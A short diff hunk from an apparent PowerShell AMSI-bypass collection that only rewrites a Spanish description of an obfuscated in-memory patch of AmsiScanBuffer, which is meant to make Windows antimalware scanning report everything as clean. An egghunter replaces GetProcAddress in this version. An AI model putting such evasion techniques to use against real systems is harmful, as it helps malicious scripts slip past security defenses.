@@ -11,7 +11,7 @@ function Invoke-MemoryPatchingObfuscated{
     
     $Bypass = New-Object -TypeName PSObject
     $Name = "Memory Patching Ofuscado"
-    $Description = "Este bypass es una versión modificada de la tecnica de parcheo de 4ms1ScanBuffer() en memoria."
+    $Description = "Este bypass es una versión ofuscada de Paul Laîné. Este consiste en parchear la función 4ms1ScanBuffer en memoria, de tal forma que AMSI siempre devuelva que el contenido no es malicioso. Esta versión del bypass de parcheo de memoria fue creada por Paul Laîné (@am0nsec), basándose en el bypass original de rasta-mouse. La diferencia con el bypass original es que en este bypass no se hace uso de la función GetProcAddress de Kernel32 sobre 4ms1ScanBuffer, si no que se hace uso de un EggHunter para localizar la función. Para la ofuscación se hizo uso de la herramienta Invoke-Obfuscation.ps1, con la cual se aplicaron varias técnicas de ofuscación."
     $Script = {
         
         ${K`ERNel`32}   =  @"
